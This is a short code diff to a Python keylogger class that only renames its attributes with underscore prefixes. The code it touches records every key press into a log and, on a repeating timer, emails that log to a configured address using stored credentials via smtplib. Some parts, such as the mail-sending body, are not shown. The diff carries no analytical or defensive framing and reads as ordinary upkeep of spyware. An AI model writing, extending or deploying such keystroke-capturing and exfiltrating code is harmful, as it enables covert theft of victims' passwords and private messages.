@@ -6,13 +6,13 @@ import smtplib
 
 class Keylogger:
     def __init__(self, time_interval, email, password):
-        self.log = "Keylogger started"
-        self.interval = time_interval
-        self.email = email
-        self.password = password
+        self._log = "Keylogger started"
+        self._interval = time_interval
+        self._email = email
+        self._password = password
 
     def append_to_log(self, string):
-        self.log = self.log + string
+        self._log = self._log + string
 
     def process_key_press(self, key):
         try:
@@ -25,9 +25,9 @@ class Keylogger:
         self.append_to_log(current_key)
 
     def report(self):
-        self.send_mail(self.email, self.password, "\n\n" + self.log)
-        self.log = ""
-        timer = threading.Timer(self.interval, self.report)
+        self.send_mail(self._email, self._password, "\n\n" + self._log)
+        self._log = ""
+        timer = threading.Timer(self._interval, self.report)
         timer.start()
 
     def send_mail(self, email, password, message):
